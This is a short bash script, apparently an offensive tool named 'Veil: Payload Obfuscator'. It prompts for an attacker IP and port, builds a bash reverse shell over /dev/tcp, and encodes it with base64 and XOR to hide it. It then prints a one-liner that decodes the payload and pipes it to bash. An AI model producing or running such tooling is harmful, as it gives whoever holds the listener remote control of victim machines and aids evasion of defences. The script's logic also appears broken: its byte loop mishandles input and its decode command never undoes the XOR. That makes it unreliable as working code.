#!/bin/bash

echo "=== Veil: Payload Obfuscator ==="
read -p "Your IP (LHOST): " LHOST
read -p "Your Port (LPORT): " LPORT

# Generate payload
PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"

# Obfuscate with base64 + XOR
ENCODED=$(echo -n "$PAYLOAD" | base64)
KEY=0x2A

XOR_ENC=$(echo "$ENCODED" | \
  xxd -p | \
  sed 's/../& /g' | \
  while read -r byte; do
    printf "%02x " $((0x$byte ^ $KEY))
  done)

echo ""
echo "[+] Encoded Payload (XOR + base64):"
echo "$XOR_ENC"
echo ""
echo "[*] To decode and execute:"
echo 'echo "<XOR_ENC>" | xxd -r -p | xxd -p -r | base64 -d | bash'

echo ""
